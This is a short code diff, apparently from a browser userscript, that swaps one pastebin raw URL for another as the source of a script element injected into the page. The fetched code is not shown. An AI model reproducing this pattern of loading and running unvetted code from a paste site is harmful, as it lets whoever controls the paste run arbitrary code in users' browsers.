@@ -256,9 +256,8 @@ if (home == 1){
     s.onload = function() {
     };
     var x = document.createElement('script');
-    x.src = "https://pastebin.com/raw/T6LRiff5";
+    x.src = "https://pastebin.com/raw/kkui9sAS";
     (document.head || document.documentElement).appendChild(x);
     x.onload = function() {
     };
 })();
-
